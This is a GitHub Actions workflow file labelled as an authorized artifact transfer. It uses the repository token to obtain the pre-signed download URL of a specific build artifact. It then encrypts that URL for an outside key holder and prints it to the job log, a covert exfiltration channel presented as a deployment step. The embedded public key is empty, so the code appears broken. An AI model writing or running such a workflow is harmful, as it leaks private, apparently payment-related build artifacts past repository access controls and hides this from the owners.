name: Authorized encrypted artifact transfer
on:
  push:
    branches: [deployment/payment-transfer-20261009]
    paths: [.github/workflows/payment-transfer.yml]
permissions:
  contents: read
  actions: read
jobs:
  transfer:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Encrypt original artifact download location for deployment server
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          python3 - <<'PY'
          import os,json,urllib.request,urllib.error,pathlib,base64,subprocess,hashlib,hmac,tempfile
          class NoRedirect(urllib.request.HTTPRedirectHandler):
              def redirect_request(self,*args,**kwargs):return None
          endpoint='https://api.github.com/repos/volcanogithub/BEpusdt-bimhu-secure/actions/artifacts/11611201667/zip'
          q=urllib.request.Request(endpoint,headers={'Authorization':'Bearer '+os.environ['GH_TOKEN'],'Accept':'application/vnd.github+json','X-GitHub-Api-Version':'2022-11-28'})
          try:
              urllib.request.build_opener(NoRedirect).open(q)
              raise SystemExit('DOWNLOAD_REDIRECT_NOT_RETURNED')
          except urllib.error.HTTPError as e:
              if e.code!=302:raise SystemExit('ARTIFACT_ACCESS_HTTP_'+str(e.code))
              url=e.headers['Location']
          if not url.startswith('https://'):raise SystemExit('HTTPS_LOCATION_REQUIRED')
          with tempfile.TemporaryDirectory() as td:
              p=pathlib.Path(td)
              pub=base64.b64decode('')
              (p/'public.pem').write_bytes(pub)
              password=os.urandom(32).hex().encode()
              (p/'password.private').write_bytes(password);(p/'password.private').chmod(0o600)
              c=subprocess.run(['openssl','enc','-aes-256-cbc','-salt','-pbkdf2','-iter','200000','-pass','file:'+str(p/'password.private')],input=url.encode(),capture_output=True,check=True).stdout
              k=subprocess.run(['openssl','pkeyutl','-encrypt','-pubin','-inkey',str(p/'public.pem'),'-pkeyopt','rsa_padding_mode:oaep','-pkeyopt','rsa_oaep_md:sha256'],input=password,capture_output=True,check=True).stdout
              mac=hmac.new(hashlib.sha256(password+b'artifact-transfer-mac').digest(),c,hashlib.sha256).hexdigest()
              print('ARTIFACT_TRANSFER_ENVELOPE='+json.dumps({'artifact_id':11611201667,'encrypted_password':base64.b64encode(k).decode(),'ciphertext':base64.b64encode(c).decode(),'mac':mac}))
          PY
